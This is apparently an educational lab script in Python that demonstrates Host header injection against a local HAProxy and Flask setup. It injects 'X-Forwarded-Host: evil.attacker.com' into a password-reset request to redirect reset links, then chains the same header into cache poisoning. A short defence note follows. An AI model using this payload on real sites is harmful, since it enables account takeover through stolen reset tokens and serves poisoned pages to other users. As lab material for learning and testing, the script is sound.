import urllib.request
import urllib.error
import json

TARGET_HOST = "localhost"
TARGET_PORT = 80
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"


def send_get(path, headers=None):
    url = f"{BASE_URL}{path}"
    req = urllib.request.Request(url, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            body = r.read().decode("utf-8", errors="replace")
            x_cache = r.headers.get("X-Cache", "N/A")
            return body, x_cache, r.status
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace"), "N/A", e.code
    except Exception as e:
        return str(e), "N/A", 0


def send_post(path, data, headers=None):
    url = f"{BASE_URL}{path}"
    payload = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        url, data=payload,
        headers={"Content-Type": "application/json", **(headers or {})}
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.read().decode("utf-8", errors="replace"), r.status
    except urllib.error.HTTPError as e:
        return e.read().decode(errors="replace"), e.code
    except Exception as e:
        return str(e), 0


def main():
    print("=== Host Header Injection ===")

    print(
        "\nBackground:\n"
        "Many web applications use the HTTP Host header to build absolute URLs,\n"
        "such as password-reset links sent by email. If the application trusts\n"
        "the Host header without validation, an attacker can supply a crafted\n"
        "X-Forwarded-Host header (forwarded by HAProxy) to redirect the reset\n"
        "link to an attacker-controlled domain. The victim clicks the link,\n"
        "and the attacker captures the reset token.\n"
    )

    # ── Step 1: normal password reset ────────────────────────────────────────
    print("[1] Sending a normal password reset request (no injected header).")
    body, status = send_post("/api/reset", {"email": "victim@example.com"})
    print(f"    Status : {status}")
    print(f"    Body   : {body[:200]}")

    try:
        data = json.loads(body)
        reset_link = data.get("reset_link", "")
        print(f"\n    Reset link generated: {reset_link}")
        if TARGET_HOST in reset_link or "localhost" in reset_link:
            print("    [✓] Link points to legitimate host — as expected.")
    except Exception:
        pass

    # ── Step 2: injected Host header ─────────────────────────────────────────
    print("\n[2] Sending password reset with injected X-Forwarded-Host header.")
    print("    X-Forwarded-Host: evil.attacker.com")

    body2, status2 = send_post(
        "/api/reset",
        {"email": "victim@example.com"},
        headers={"X-Forwarded-Host": "evil.attacker.com"}
    )
    print(f"    Status : {status2}")
    print(f"    Body   : {body2[:200]}")

    try:
        data2 = json.loads(body2)
        reset_link2 = data2.get("reset_link", "")
        print(f"\n    Reset link generated: {reset_link2}")
        if "evil.attacker.com" in reset_link2:
            print("    [!] VULNERABLE — link points to attacker domain!")
            print("    [!] Victim receives this link by email and clicks it.")
            print("    [!] Attacker captures the reset token at evil.attacker.com.")
        else:
            print("    [✓] Host header injection blocked — link uses legitimate host.")
    except Exception:
        pass

    # ── Step 3: cache poisoning via Host header ───────────────────────────────
    print("\n[3] Chaining with cache poisoning — poisoning a cached page via Host header.")
    print("    Sending GET / with X-Forwarded-Host: evil.attacker.com")

    body3, x_cache, status3 = send_get(
        "/",
        headers={"X-Forwarded-Host": "evil.attacker.com"}
    )
    print(f"    Status  : {status3}")
    print(f"    X-Cache : {x_cache}")

    if "evil.attacker.com" in body3:
        print("    [!] evil.attacker.com is reflected in the cached response.")
        print("    [!] Any user who now requests / will receive the poisoned page.")
    else:
        print("    [~] Host header not reflected in this response.")

    print(
        "\nExplanation:\n"
        "1. HAProxy forwards the X-Forwarded-Host header to the backend.\n"
        "2. The Flask backend trusts X-Forwarded-Host to build absolute URLs\n"
        "   (e.g. password reset links, canonical links in HTML).\n"
        "3. An attacker injects X-Forwarded-Host: evil.attacker.com.\n"
        "4. The backend generates a reset link pointing to evil.attacker.com.\n"
        "5. The victim receives the email, clicks the link, and the token\n"
        "   is sent to the attacker's server — full account takeover.\n"
        "6. If the response is cached (Step 3), ALL users receive the\n"
        "   poisoned page with attacker-controlled URLs until cache expires.\n"
        "Defense: validate the Host header against an allowlist of known\n"
        "   domains; never build URLs from user-supplied headers.\n"
    )


if __name__ == "__main__":
    main()